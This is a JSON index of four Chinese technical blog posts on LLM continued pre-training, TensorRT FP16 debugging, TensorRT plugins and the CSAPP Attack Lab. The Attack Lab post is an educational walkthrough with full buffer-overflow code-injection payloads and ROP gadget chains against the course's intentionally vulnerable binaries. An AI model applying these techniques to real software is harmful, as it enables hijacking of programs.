{
  
    
        "post0": {
            "title": "如何做 continued pre-train",
            "content": "在 LLM 中，为了获得一个好的 basemodel，往往都会使用 pre-train 的方式。但是通常 pre-train 都需要消耗很多资源，不管是算力还是数据。其实除了 pre-train 之外，还有一种方案叫做 continued pre-train，这篇文章会简要介绍一下这种方案。 . 0x0 什么是 continued pre-train . continued pre-train 从名字就可以看出，他是在 pre-train 的基础上继续训练，是一个 secondary stage 任务。他的 loss function 和 pre-train 完全一致，在 decoder-only 的架构下是以 AR1 做为目标进行训练。 . 我们知道 SIFT2 也是一个 pre-train 的 secondary stage 任务，那么他们之间有什么区别呢？ 他们之间的区别主要有下面这几个方面：1）SIFT 的数据规模和 continued pre-train 不同，远远少于 pre-train 阶段，而且 SIFT 如果使用过多的数据容易出现 overfitting 的问题；2）SIFT 的数据对质量和多样性的要求比较高；3）SIFT 和 pre-train 的 loss objective 有轻微区别，SIFT 是部分的 AR，会 mask 掉 instruction 部分，只对 response 部分算 loss。 . 0x1 为什么要做 continued pre-train . continued pre-train 介于 pre-train 和 SIFT 之间，他的存在有着他的独特价值。 . 目前存在的基本共识是 pre-train 阶段将知识注入模型，在 SIFT 阶段学习 style 和 instruction follow 的能力。所以当我们需要注入新知识的时候，continued pre-train 就派上用场了。 . 当注入的新知识只是很小的一部分，pre-train from scratch 并不是一个高效的选择，另外有的时候我们只能拿到模型训练好的权重，并不能拿到 pre-train data，所以想要重新 pre-train 也是不可能的。 . 有的时候，针对特定 domain 进行 continued pre-train 能让模型的能力更 focus 在对应的 domain 上获得更好的能力。 . 0x2 continued pre-train 有什么挑战 . 虽然说 continued pre-train 和 pre-train 非常类似，就是在 pre-train 模型的基础上继续训练，但是还是会有一些新的问题。 . 0x2.1 词表扩充问题 . 我们知道模型在进行训练之后，需要对 corpus 做 tokenize，如果要做 continued pre-train 的 corpus 和之前 pre-train 的不一致，就会遇到 tokenize 效率的问题。 . 比如之前 Meta 开源的 LLaMa 模型，它有着非常强的性能，但是其在英文语料上进行训练的，如果希望他支持中文，就需要用中文进行 continued pre-train。但是 LLaMa 的 tokenizer 是在英文语料上训练的3，在遇到没有见过的中文时候，会怎么样呢？ . 实际上，现在的 tokenizer 基本都是基于 BPE4 设计的，所以原理上能够支持所有的字符，当他遇到没有见过的字符时，它会 fall back to bytes，比如 “我” 这个字符就可以用 E6 88 91 来表示，最终也可以被 tokenizer 编码。 . 但是这种策略会引入效率的问题，不仅会影响 tokenizer 的 encode/decode 效率，还会显著增加编码之后的序列长度，这也直接影响了模型的训练效率，相当相同的 token 数包含的信息更少了。 . 这篇文章EFFICIENT AND EFFECTIVE TEXT ENCODING FOR CHINESE LLAMA AND ALPACA 提出可以通过扩充词表来解决这个问题。方法非常简单，具体来说就是对新 domain corpus 用 SentencePiece 重新训练一个 tokenizer，然后将新的词表和之前旧的词表重新合并在一起，在合并的时候取他们的并集，同时扩充 embedding，保留之前训好的 embedding，在后面初始化新词表的 embedding，这样可以保证之前训练好的 embedding 不受影响。 . 因为新加的词表是随机初始化的，和之前训好的词表在分布式上是不一致的，所以可以考虑固定网络的其它层，先少规模 tuning embedding 的部分。 . 0x2.2 防止遗忘的问题 . 当我们对模型注入新知识的时候，可能导致模型遗忘之前学习到的知识，比如用 code 对模型进行 continued pre-train 时，一些 text-based tasks 性能会降低。为了缓解这个问题，可以在 data mixture 的时候，采样之前 domain 的数据，和当前 domain 的数据按照某种比例进行混合。除此之外，还可以考虑使用 EMA 或者是 mean-teacher 的方案来更新模型，防止模型过快地遗忘之前的知识。 . 0x2.3 如何高效 tuning . continued pre-train 的一个优势是不需要从头训练之前见过的 token，只需要训练新增的 token。为了更进一步降低成本，还可以在 continued pre-train 阶段使用 LoRA5 tuning，这种方案可以不用训练模型的所有参数，只需要一部分很小的参数，实现更小的显存和更快的训练速度。 . 0x3 总结 . 这篇文章主要介绍一下 continued pre-train 的好处以及其应用场景，分析了 continued pre-train 面临的一些问题。笔者水平有限，如有遗漏或者问题，欢迎指出。 . Auto Regressive. &#8617; . | Supervised Instruction Fine-Tuning. &#8617; . | Less than one thousand Chinese character. &#8617; . | Byte-Pair Encoding. &#8617; . | https://github.com/microsoft/LoRA &#8617; . |",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/llm/pre-train/2023/07/04/continued-pretrain-intro.html",
            "relUrl": "/deep%20learning/llm/pre-train/2023/07/04/continued-pretrain-intro.html",
            "date": " • Jul 4, 2023"
        }
        
    
  
    
        ,"post1": {
            "title": "如何 Debug PyTorch 和 TensorRT FP16 diff",
            "content": "0x0 问题的开始 . 一般在 NVIDIA 的显卡上部署模型都会使用 TensorRT，同时 TensorRT 也提供了很多默认的优化，比如 kernel fusion、graph optimization 以及 FP16 推理等等。一般这些优化都会默认打开，大部分情况模型的推理结果都不会有太大的区别，不过最近笔者却发现打开 FP16 推理却会出现较大的 diff。 . 模型是一个 CNN + Transformer 的结构，使用 FP32 推理的时候 diff 非常小，而且之前也测试过 FP16 推理，虽然和 PyTorch 的推理结果相比有一定的误差，比如有一些 box regression 的误差有 0.3 左右，不过这个也在我们可以接受的范围内。 . 但是最近用了更多的数据集训练模型之后，模型突然出现 FP16 结果和 PyTorch diff 相差特别大的情况，有的误差达到了 3-5，这明显是不正常的，需要好好查找出现的问题。 . 0x1 FP32 和 FP16 的代沟 . 首先我们排除模型本身在转换过程中的问题，因为 TensorRT FP32 的推理结果和 PyTorch 的推理结果是很接近的，所以问题就锁定在 FP16 推理上。 . 0x1.1 TensorRT FP16 Inference . 首先回顾一下 TensorRT FP16 推理的流程，在推理过程中，网络的权重和输入都会 cast 成 FP16，所有中间的 activation 也会使用 FP16 来进行存储和处理，这样在计算和访问的时候，相比 FP32可以带来明显的性能提升。 . 下面是 FP32 和 FP16 所表示的范围，一般来说，inputs 和 weights 在 cast 成 FP16 的时候都不会有什么问题，特别是模型在训练收敛之后，dynamic range 一般都在 FP16 之内，就算在范围外，在 cast 成 FP16 也不会有太大的误差，我们可以通过遍历模型的权重来 check 参数的范围是否在 FP16 的范围呢。 . import torch state_dict = torch.load(&quot;model_final.pth&quot;)[&quot;model&quot;] for name, param in state_dict.items(): max_val = torch.abs(param.data).max() if max_val &gt; 2**15: abs_diff = torch.abs(param.data.to(torch.float16) - param.data).max() print(f&quot;Parameter &#39;{name}&#39; and fp16 range diff: {abs_diff}.&quot;) . 而输入一般会做 normalization，所以也不会超过 FP16 的 dynamic range，唯一有可能出问题就是中间的 activation 的计算，可能存在溢出的问题。 . 0x1.2 AMP Training Recap . 一般来说，为了让模型在使用 FP16 进行推理的时候，也能输出正常的结果，我们会采样混合精度训练的方式，在训练过程中使用 FP16 进行 Forward/Backward pass，下面我们简单回顾一下 AMP Training 的原理。 . 在 MIXED PRECISION TRAINING 这篇论文中，作者提出了混合精度训练的原理，我们也可以用一张图来简单表示整体的训练流程。 . 其中要特别注意以下 3 点，weight backup，loss scaling 以及 FP16 white list。 . 0x1.1.1 weight backup . 在混合精度训练的时候，需要使用 FP16 进行 forward&amp;backward pass 来达到加速的目的，但是在 backward 的过程中，gradient 很容易出现数值不稳定的问题，所以保留 weight 的 FP32 精度可以更好的防止这个问题。 . 0x1.1.2 loss scaling . 因为 backward 的时候梯度非常小，在 FP16 容易出现 underflow 的问题导致 gradient 为 0，这样参数就没有办法更新了。所以采用 loss scaling 的方式，在 loss 做 backward 之前乘上一个比较大的系数，将 gradient 拉到 FP16 可以表示的范围内，在更新的时候采用精度更高的 FP32。 . 0x1.1.2 FP16 white list . 有一些操作在 FP16 下是数值不稳定的，比如 normalization 操作，因为他们要算输入的统计量，这些统计量在 FP16 会被截断，这样会造成训练过程中数值稳定性的问题，可能会使得训练不收敛。一些常见的 FP32 white list 就是各种 normalize 操作，softmax，一些需要使用 log 的激活函数或者是矩阵求逆的运算等等。 . 0x2 寻找错误的原因 . 模型在训练的时候使用了混合精度，整个 forward 过程其实已经在用 FP16 做计算了，正常来说模型在推理阶段直接使用 FP16 进行推理是不应该出现问题的，实际上可以用 PyTorch 模型进行 FP16 的推理做验证，只需要在模型推理的时候加上下面的代码，可以验证在 PyTorch 下 FP16 和 FP32 的误差很小。 . with torch.no_grad() and torch.autocast(&quot;cuda&quot;, enabled=fp16_mode): outputs = model.forward(inputs) . 所以问题就出在 TensorRT 的模型导出上， 因为 TensorRT 会在内部做一些优化，比如 layer fusion 等，所以大概率是模型在 fusion 之后，某些 layer 的 FP16 精度出现上溢或者下溢的问题，导致最终模型的输出结果异常。 . 0x2.0 二分法定位 . 因为 TensorRT 是一个黑盒，没有开源 inference 的代码，而 onnx 模型通过 TensorRT parser 之后，得到的模型结构和 layer 名称完全对不上，所以没有办法显式地和 PyTorch 中的每一层对齐，可以通过遍历只能通过。 . 0x2.1 逐 module 定位 . 0x3 后记 . 0x4 Reference . 全网最全-混合精度训练原理 . (抛砖引玉)TensorRT的FP16不得劲？怎么办？在线支招！ . https://github.com/zerollzeng/tiny-tensorrt/issues/41 . https://github.com/NVIDIA/TensorRT/issues/1262 . TensorRT/debug_accuracy.md at main · NVIDIA/TensorRT .",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/deployment/tensorrt/inference/onnx/2023/02/28/find-trt-fp16-diff.html",
            "relUrl": "/deep%20learning/deployment/tensorrt/inference/onnx/2023/02/28/find-trt-fp16-diff.html",
            "date": " • Feb 28, 2023"
        }
        
    
  
    
        ,"post2": {
            "title": "TensorRT 使用 Custom Plugin",
            "content": "0x0 Introduction . 在模型开发的流程中，除了训练模型之外，另外一个同样重要的部分就是模型部署，常见的部署方式有两种，一种是直接使用原生的训练框架做推理，另外一种是使用硬件厂商提供的加速器。 一般情况下，可以选择简单易用的第一种方式，但是在对性能有极致要求的边端设备上，就只能选择第二种方式，这个时候就需要设计到模型从训练框架到加速器的转换流程。 . 目前工业界比较常见的流程是通过 onnx 作为模型的中间表达(IR)，即所有的训练框架(PyTorch, TensorFlow, etc.) 在训练完成之后都转换成 onnx，然后再转换成加速器的 IR，比如 TensorRT 的 engine，虽然这个流程转换并不容易，中间也有很多坑，但是这个流程确实是一个比较通用。 .",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/deployment/tensorrt/inference/onnx/2022/09/09/tensorrt-plugin.html",
            "relUrl": "/deep%20learning/deployment/tensorrt/inference/onnx/2022/09/09/tensorrt-plugin.html",
            "date": " • Sep 9, 2022"
        }
        
    
  
    
        ,"post3": {
            "title": "CSAPP 之 Attack Lab",
            "content": "0x0 Introduction . 在学习完汇编和系统安全相关的内容之后，为了更好的理解相关的内容，csapp 提供了一个配套的 lab，提供了两种方式的攻击，一种是直接写入 code，让程序在 return 时执行我们传入的另外一个函数地址；另外一种方式是通过组合代码中已有的片段，让代码按照我们想要的方式运行，最终被我们接管。 . 通过完成 attack lab，可以更好地理解 buffer overflow 相关的内容，同时也可以真正理解 code-injection 和 return-oriented 这两种攻击方式，最终可以更好地帮助我们写出安全漏洞更小的代码 。 . 在完成 lab 的同时，也可以让我们对 gdb 以及 objdump 等相关工具更熟练的掌握，对 stack frame 有深入的理解。 . 下面我们先介绍一下完成这个 lab 之前的一些工具准备工作，之后再分别介绍两种不同的攻击方式是如何实现的。 . 0x0.1 Preparation . 第一个需要使用的工具是 gcc，需要用它来编译汇编代码，因为我们要在程序中插入自己的代码，所以需要用 gcc 将这段汇编代码编译，等待后续的使用； . gcc -c test.s . | 接着需要用到 objdump，这是用来将汇编代码转换成实际的机器码，因为需要传递给计算机执行，不能将汇编代码直接传进去，需要先通过 gcc + objdump 将汇编代码变成机器码； . objdump -d test.o . | 最后需要使用的是 lab 中提供的工具 hex2raw，因为程序需要的输入是字符串，但是我们工具的时候希望传入字节码，这个工具可以将我们期望传入程序的字节码转换成字符串； . ./hex2raw &lt; exploit.txt &gt; exploit.bin . | 通过这三个工具我们就可以将需要执行的汇编代码转换成字节码，最终送到计算机中进行执行，这三个工具也给了我们做 code-injection 攻击的基础。 . 0x0.2 Target Programs . 这个 lab 中一共有两个 program 需要进行攻击，分别是 CTARGET 和 RTARGET，它们都是从 standard input 中读入 strings，主要是利用了下面 getbuf 这个函数 . unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } . 函数 Gets 和 gets 当 BUFFER_SIZE 足够大或者是 string 很小的时候是没有区别的，他们的行为就是将输入的 string 复制到目标位置，比如下面的例子 . 当输入比较短的字符串序列时，可以获得正常的结果。 . unix&gt; ./ctarget -q Cookie: 0x59b997fa Type string:Keep it short! No exploit. Getbuf returned 0x1 Normal return . 当输入比较长的字符串序列时，会触发 segmentation fault。 . unix&gt; ./ctarget -q Cookie: 0x59b997fa Type string:This is not a very interesting string, but it has the property that Ouch!: You caused a segmentation fault! Better luck next time FAIL: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:FAIL:0xffffffff:ctarget:0:54 68 69 73 20 69 73 20 6E 6F 74 20 61 20 76 65 72 79 20 69 6E 74 65 72 65 73 74 69 6E 67 20 73 74 72 69 6E 67 2C 20 62 75 74 20 69 74 20 68 61 73 20 74 68 65 20 70 72 6F 70 65 72 74 79 20 74 68 61 74 . 我们的任务就是通过 ctarget 输入一个字符串来实现对这个程序的攻击，下面我们来具体针对每个 case 进行讲解。 . 0x1 Code Injection Attacks . 对于前三个阶段，你需要把输入 string 存在 stack 中，如果 string 这包含一段可执行文件的字节编码，那么程序会将这个字符串看做可执行的代码，这样就实现了对代码的攻击。 . 0x1.1 Level 1 . 这个阶段是一个热身环节，不需要插入可执行的代码，只需要在程序返回的时候，重定向到另外一个存在的 procedure 中就可以了。 . 首先通过 objdump -d ctarget &gt; ctarget.s 可以将可执行程序反编译成汇编代码，而 getbuf 主要在下面的 test 函数中进行调用 . void test() { int val; val = getbuf(); printf(&quot;No exploit. Getbuf returned 0x%x n&quot;, val); } . 当 getbuf 执行结束之后，函数会返回到 test 中继续执行后面的语句，在这次攻击中，我们希望程序在执行完 getbuf 之后可以跳到 touch1 这种函数中，而不要继续在 test 中执行。 . void touch1() { vlevel = 1; / * Part of validation protocol * / printf(&quot;Touch1!: You called touch1() n&quot;); validate(1); exit(0); } . 首先可以在汇编中找到 test 和 getbuf 对应的位置代码如下 . 0000000000401968 &lt;test&gt;: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 &lt;getbuf&gt; 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 &lt;__printf_chk@plt&gt; 40198c: 48 83 c4 08 add $0x8,%rsp ... . 00000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop . 在 getbuf 中，程序首先将栈顶 %rsp 减小 0x28=40 个字节，接着通过调用 Gets 获得用户输入的字符串，然后再将栈顶增加 40 个字节，最后通过 retq 退出这个函数的执行。 . 通过 gdb 进行执行，在 getbuf 这个函数开始时打上断点，然后进行运行，接着通过下面的命令查看分配的 buffer 大小 . (gdb) x/6gx $rsp 0x5561dc78: 0x0000000000000000 0x0000000000000000 0x5561dc88: 0x0000000000000000 0x0000000000000000 0x5561dc98: 0x0000000055586000 0x0000000000401976 . 可以发现当程序执行完毕之后，增加栈顶，最终返回的地址是 0x401976，这正是 test 函数中调用 getbuf 之后一行的执行地址，所以我们只需要写入字符串，让字符串 overflow，将这个返回的地址变成我们希望他执行的函数 touch1 的地址 0x4017c0 即可。 . 所以输入的字符串如下 . 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 . 其中前面 5 行，每行 8 个字节，一共 40 个字节填充了栈中的 buffer，接着填入 c0 17 40 替换之前的返回地址，这里要注意填入的顺序，返回地址是 0x4017c0，在填入 buffer 的时候，顺序是按地址从小到大依次填入每个字符，所以应该填入 c0 17 40，这样从地址中拿到的数据才是 0x4017c0。 . 接着可以通过 gdb 验证一下输入这样的 string 后 stack 中的内存变化 . (gdb) x/6gx $rsp 0x5561dc78: 0x0000000000000000 0x0000000000000000 0x5561dc88: 0x0000000000000000 0x0000000000000000 0x5561dc98: 0x0000000000000000 0x00000000004017c0 . 发现确实已经生效了，最后通过下面的方式验证 level1 攻击已经成功。 . ./hex2raw -i ctarget.1.txt| ./ctarget -q Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: . 通过上面的信息提示可以看到，我们已经成功的调用了 touch1。 . 0x1.2 Level 2 . level2 攻击需要对输入的字符串插入一小段可执行的代码，除了要求程序返回的时候跳转到 touch2 这个函数，还需要 val==cookie 这个条件满足。 . void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(&quot;Touch2!: You called touch2(0x%.8x) n&quot;, val); } else { printf(&quot;Misfire: You called touch2(0x%.8x) n&quot;, val); } exit(0); } . 如果要执行到 touch2，那么和 level1 类似，只需要输入字符让其 overflow 栈中的内存，覆盖掉之前的返回地址即可。另外的一个需求是要对函数 touch2 的第一个参数修改为 cookie 这个值，需要插入一段汇编代码，但是如何让插入的这段汇编代码执行呢？ . 原理可以用下面的这幅图来表示 . 相当于在 Q stack frame 中插入一段字符串，不过不要用 touch1 的地址去覆盖之前的返回地址，而是用 B 的地址去覆盖，这样程序在执行完 Q 之后就会跳到 B 的地址出继续执行，而 B 地址出的内存是我们通过 string 传入的内容，这样我们就可以传入一段可以执行的命令，在执行完之后，通过 retq 再跳转到 touch2 的执行地址。 . 前面通过 gdb 查看 getbuf 中的内存，发现栈顶的地址是 0x0x5561dc78，所以我们可以把需要执行的代码段在最前面写入，然后把这个地址放到 0x4017c0 的位置就可以插入我们要执行的代码。 . (gdb) b*0x4017ac (gdb) r -q (gdb) x/6gx $rsp 0x5561dc78: 0x0000000000000000 0x0000000000000000 0x5561dc88: 0x0000000000000000 0x0000000000000000 0x5561dc98: 0x0000000000000000 0x00000000004017c0 . 下面来看一下我们需要执行的代码应该怎么写，这里需要就 val 设置成 cookie 的值，那么如何找到 cookie 的值呢？ . 可以运行到 touch2 然后打断点，简单地将 level1 中 touch1 的地址修改为 touch2 即执行到 touch2 中，然后通过在 gdb 中运行 x 0x6044e4 发现 cookie 的值为 0x59b997fa，所以只需要把 %rdi 设置成 cookie 值即可。 . 所以要执行的代码就是设置 val 的值，即为 touch2 函数的第一个参数，对应寄存器为 $rdi，接着再执行 touch2 函数，这里可以首先将 touch2 的地址压到栈里面，执行完指令之后，通过 retq 就可以执行这个压栈地址对应的 procedure，这种方式相对来说最简单，那么对应的代码如下 . pushq $0x4017ec movq $0x59b997fa,%rdi ret . 将这个文件保存为 example.s，然后通过下面的方式，首先 assemble 这个文件，然后 disassemble 它 . unix&gt; gcc -s example.s unix&gt; objdump -d example.o &gt; example.d . 这样就可以得到 example.d 的文件如下 . Disassembly of section .text: 0000000000000000 &lt;.text&gt;: 0: 68 ec 17 40 00 pushq $0x4017ec 5: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi c: c3 retq . 从上面的代码中就可以看出，对应的 3 个汇编指令的字节码，比如第一个 pushq 的字节码就是 68 ec 17 40 00，最终写入的 txt 文本为 . 68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 . 中间的 00 是为了填充空白的内存，最后在栈顶将返回的地址替换成 0x5561dc78，这样就会执行写入字符串的 3 个指令，接着再执行 touch2。 . ./hex2raw -i ctarget.2.txt| ./ctarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target ctarget PASS: Would have posted the following: . 0x1.3 Level 3 . sval 就是需要我们传入的参数，cookie 是需要比较的内容，可以先找到 touch3 函数的地址是 0x4018fa，先使用 gdb在 touch3 的入口打上断点，然后按照 level1 的做法，让程序在 return 之后跳转到 touch3，接着单步运行，到执行 hexmatch 函数之前，这个时候可以通过下面的方式访问需要的字符串以及他们对应的 16 进制数字 . (gdb) x/s 0x6044e4 0x6044e4 &lt;cookie&gt;: &quot; 372 227 271Y&quot; (gdb) p/x &quot; 372 227 271Y&quot; $3 = {0xfa, 0x97, 0xb9, 0x59, 0x0} . 接着再将这里的16进制数字转换成 anscii 码，比如 f 对应 0x66，以此转换即可得到需要写入的 16 进制数字。 . 在获得了需要输入的字符串之后，我们可以仿照 level2 进行数据的插入，不过需要思考一个问题，那就是在调用 hexmatch 这个函数的时候，会有压栈的操作，如果保存的数据在栈里面，有可能会被覆盖。 . 我们可以查看 hexmatch 的代码，发现在压栈的时候，有下面这行代码 . 401850: 48 83 c4 80 add $0xffffffffffffff80,%rsp . 将上面的立即数翻译成一个有符号的正数，结果就是 -128，所以栈顶会减小 128 个字节，如果将数据放在这里，会出现覆盖的风险，应该将字符串放在 $rsp 最大的位置。 . 可以通过打断点，在 getbuf 的 retq 停下来，然后通过 p/x $rsp 获得目前栈顶的地址是 0x5561dca0，接着会执行 retq 操作，这样栈顶会增加 8，这就是整个程序运行过程中的最大栈顶地址，我们可以在这里写入需要传到 touch3 中的字符串，那么这里的地址就是 0x5561dca8，所以最终我们插入的可执行代码为 . pushq $0x4018fa movq $0x5561dca8,%rdi retq . 接着仿照 level2 的做法可以获得这段可执行代码的字节码如下 . 0000000000000000 &lt;.text&gt;: 0: 68 fa 18 40 00 pushq $0x4018fa 5: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi c: c3 retq . 所以最后我们要写入的 txt 文本为 . 68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 . 最顶上是可执行代码，接着中间是占位符，然后填入执行代码的地址是 0x5561dc78，在最后输入字符串对应的 anscii 码。 注意字符串从内存中读取的时候，是按地址从小到大进行读取的，但是在写入字符串的时候却是从大到小，所以这里需要颠倒一下顺序。 . 0x2 Return-Oriented Programming . 有的时候采用 code-injection 攻击会变得非常困难，因为有两个技术可以用来防止这种攻击： . 使用 randomization 的方式，每一次 stack position 都会不一样，所以没有办法确定插入的代码在计算机中的地址，也就无法让程序运行插入的代码。 . | 标记 stack 所在的内存为不可执行的状态，在这个情况下，即使插入了攻击的代码，在运行它的时候也会遇到 segmentation fault。 . | . 那么是不是在这种情况下我们就无法对程序进行攻击了呢？ . 聪明的程序员发现可以通过执行代码中存在的片段而不是插入代码来实现攻击，最通用的方式叫做 return-oriented programming(ROP)，这种策略通过识别存在于程序中 ret 字节序列中的一个或多个指令，这些片段叫做 gadget. . 上面的图举例说明了一个 stack 是如何执行一系列的 gadgets，图中的 stack 包含了一系列 gadget 地址，每个 gadget 包含了一系列指令的字节，不过字节的最后是 0xc3，这个字节表示 ret，每次执行完一条指令之后，就可以跳到上一条指令继续执行，这样就可以形成一个序列的执行指令。 . 例如，下面的 C 函数可以对应生成的会变代码如下 . void setval_210(unsinged *p) { *p = 3347663060U; } . 0000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq . 字节序列 48 89 c7 可以编码一个指令 movq %rax, %rdi，同时这个序列最后包含 c3，即 ret 指令。同时这个函数的开始地址是 0x400f15，序列从第四个字节开始，所以这就是一个 gadget，可以达到的效果是将寄存器 %rax 的值放到寄存器 %rdi 中。 . 0x2.1 Level 4 . 在 level4 中，只需要重复 level2 的过程，但是 level2 是通过 code-injection 进行攻击的，level4 采用 gadget 的方式，可以通过 gdb 发现每次运行 $rsp 在不同，所以不能准确地定位到插入代码的位置。 . rtarget.s 中提供了一系列的可执行序列，可以在里面选择需要执行的 gadget 序列。 . 对于 level2 而言，可以构造下面的汇编代码达到目的，因为 pop %rax 可以先将 $rsp 的内容写到 $rax 中，然后再将其赋值到 $rdi 中就实现了我们需要的结果。 . pop %rax; 58 movq %rax, %rdi; 48 89 c7 retq; c3 . 在 rtarget.s 中可以找到下面两个函数，其中正好有我们需要的指令序列，第一个指令的开始位置为 4019cc，执行的序列为 58 90 c3，其中 0x90 表示 nop 指令，所以这对应于 pop %rax + retq。 . 而 4019a2 则为 48 89 c7 c3，这就对应 movq %rax, %rdi + retq。 . 00000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq 00000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq . 所以最后写入的 txt 文本为 . 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 # 执行 pop %rax 指令 + retq fa 97 b9 59 00 00 00 00 # cookie 的值 0x59b997fa a2 19 40 00 00 00 00 00 # 执行 movq %rax, %rdi + retq ec 17 40 00 00 00 00 00 # 执行 touch2 . ./hex2raw -i rtarget.2.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: . 0x2.2 Level 5 . Level5 和 Level3 类似，不同点在于 Level3 使用自己插入的代码进行攻击，而 Level5 需要使用 gadget 的方式，这让任务变得更难了。 . 按照 Level3 的要求，需要传入一个字符串的指针，字符串由于有被栈覆盖的风险，所以需要放在栈顶的最大可能位置。在 Level3 里面获取字符串的地址比较容易，因为每次程序启动的地址都是一样的，这意味着每次都可以确定写入的字符串地址，但是在 Level5 中，这个方式并不可行，因为每次程序执行的地址都不一样。 . 那么有什么办法可以获取到字符串的地址呢？既然绝对地址不可获取，那么我们可以通过相对地址的方式来进行获取，具体来说就是通过 getbuf 执行完之后的地址作为基础地址，然后通过计算插入的字符串地址和这个位置的偏移量来得到最终的字符串地址。可以用下面的一个示意图来举例。 . movq %rsp, %rdi popq %rsi offset lea (%rdi,%rsi,1),%rdi 0x4018fa touch3 addr &quot;&quot; string content . 在 offset 上面的指令将栈帧 %rsp 放到 %rdi 中保存，这样就可以保留基础地址，然后将 offset 的值放到 %rsi 中，最后通过 lea 进行地址的计算，获得 string 的有效地址。如果可以自己插入指令去运行，非常简单就可以完成这个实验，但是问题是我们无法获取插入指令的地址，就像上面说的，每次地址都会变化，所以需要采用 gadget 的方式，即在已有代码中对片段进行选择。 . 通过在 rtarget.s 中对代码片段进行挑选，通过组合之后可以获得下面的代码，其中 movq %rsp, %rdi 因为没有现成的代码片段，所以被拆分成了 movq %rsp, %rax 和 movq %rax, %rdi。 . 而 popq %rsi 则需要更多的指令进行完成，这里就不具体解释了，直接通过阅读下面的汇编代码就可以了解对应的内容。 . 401a06 48 89 e0 c3 mov %rsp, %rax 4019c5 48 89 c7 90 c3 mov %rax, %rdi 4019cc 58 90 c3 popq %rax (72 -&gt; %rax) 0x48(72) offset 401a20 89 c2 00 c9 c3 movl %eax, %edx 401a34 89 d1 38 c9 c3 movl %edx, %ecx 401a27 89 ce 38 c0 c3 movl %ecx, %esi 4019d6 48 8d 04 37 c3 (%rdi,%rsi,1),%rax 4019c5 48 89 c7 90 c3 movq %rax, %rdi 4018fa touch addr string content . 最后来决定 offset 的值，通过计算在字符串内容之前插入的 gadget 和其他的内容的行数，可以算出在 10 进制下是 9*8 = 72，在 16 进制下则为 48。 . 最终写入的 txt 文本为 . 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 20 1a 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 27 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 . ./hex2raw -i rtarget.3.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch3!: You called touch3(&quot;59b997fa&quot;) Valid solution for level 3 with target rtarget PASS: Would have posted the following: . 0x3 Conclusion . 通过完成 attack lab，相当于自己去走一遍黑客攻击的流程，之前一直对黑客是如何攻击的并不清楚，而且也比较好奇，这个 lab 虽然简单，却通过两种攻击方式的演示详细地揭示了这个过程，而且通过自己动手做实验，更清楚了其中的流程，算是解答了之前关于黑客攻击的一些疑惑。 . 另外这个实验虽然是一个攻击实验，但是却给了我们一些启发，了解敌人的攻击方式之后可以更好地为防御他们做准备。同时通过这个实验，再一次巩固了汇编的内容，加深了栈帧的理解，对程序调用，压栈和退站有了更好的理解。 . 0x4 Reference . recitation05-attacklab.pptx (cmu.edu) | attacklab.pdf (cmu.edu) | 《深入理解计算机系统》Attack Lab实验解析 Yi’s Blog (earthaa.github.io) | 《深入理解计算机系统》实验3.Attack Lab 贺巩山的博客 (hegongshan.com) | .",
            "url": "https://l1aoxingyu.github.io/blogpages/operation%20system/c/csapp/assembly/attack/disassembly/2022/03/15/csapp-attack.html",
            "relUrl": "/operation%20system/c/csapp/assembly/attack/disassembly/2022/03/15/csapp-attack.html",
            "date": " • Mar 15, 2022"
        }
        
    
  
